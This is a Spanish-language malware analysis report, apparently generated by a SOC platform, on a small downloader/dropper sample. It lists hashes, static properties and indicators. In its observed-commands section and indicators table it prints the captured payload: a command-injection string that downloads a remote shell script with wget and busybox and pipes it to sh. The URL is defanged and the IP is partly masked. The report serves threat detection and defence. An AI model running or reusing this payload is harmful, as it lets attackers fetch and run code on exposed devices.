# 🧬 Payload Analysis

`c6da75d35d3344386d86556f39eeb722469c7985c588664819945d5fe74a9543`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `c6da75d35d3344386d86556f39eeb722469c7985c588664819945d5fe74a9543`
- **MD5:** `3d8f0517cbc6b0e04da01f196b9cb6ac`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 171 B |
| Entropía | 4.74 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
sz11gChannel=1`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s wdr1;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 91.92.40.XXX | static_analysis |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| hash | c6da75d35d3344386d86556f39eeb722469c7985c588664819945d5fe74a9543 | static_analysis |
| command | sz11gChannel=1`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s wdr1;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh - | strings |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
